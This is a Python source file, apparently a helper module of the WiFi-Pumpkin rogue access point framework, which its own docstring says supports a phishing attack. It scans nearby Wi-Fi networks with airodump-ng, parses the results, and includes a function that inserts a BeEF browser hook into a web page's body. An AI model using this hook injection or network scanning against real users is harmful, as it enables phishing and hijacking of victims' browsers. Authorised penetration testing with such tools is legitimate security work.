from os import popen
from BeautifulSoup import BeautifulSoup
from core.utility.threads import ProcessThreadScanner

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes functionality
    for Phishing attack.

Copyright:
    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

def airdump_start(interface):
    process = ProcessThreadScanner(['xterm',
    '-geometry', '85x15-1+250', '-T',
    'scan AP Airodump-ng', '-e', 'airodump-ng', interface,
    '--write', 'settings/Dump/networkdump'])
    process.name = "Airodump-ng scan"
    process.start()
    process.join()
    return None

def Beef_Hook_url(soup,hook_url):
    try:
        for link_tag in soup.findAll('body'):
            link_tag_idx = link_tag.parent.contents.index(link_tag)
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
            return soup
    except NameError:
        print('[-] please. your need install the module python-BeautifulSoup')

def get_network_scan():
    list_scan = []
    try:
        xml = BeautifulSoup(open("settings/Dump/networkdump-01.kismet.netxml", 'r').read())
        for network in xml.findAll('wireless-network'):
            try:
                essid = network.find('essid').text
                if not essid:
                    essid = 'Hidden'
                channel = network.find('channel').text
                bssid = network.find('bssid').text
                list_scan.append(channel + "||" + essid + "||" + bssid)
            except Exception:
                pass
        popen("rm settings/Dump/networkdump*")
        return list_scan
    except IOError:
        return None